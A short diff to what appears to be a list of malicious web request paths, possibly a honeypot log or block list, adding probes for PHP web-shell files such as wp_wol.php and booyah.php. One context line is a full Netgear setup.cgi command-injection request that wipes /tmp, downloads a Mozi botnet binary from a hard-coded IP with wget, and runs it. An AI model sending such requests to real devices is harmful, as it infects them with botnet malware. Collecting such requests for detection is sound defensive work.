@@ -7797,3 +7797,12 @@ http://httpbin.org/
 /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://45.164.177.135:11644/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
 api.ipify.org:443
 /xmlrpc.php0
+/bi.php
+/v4.php
+/special.php
+/nf.php
+/ind.php
+/raf.php
+/wp_wol.php
+/booyah.php
+/ioxi-o.php
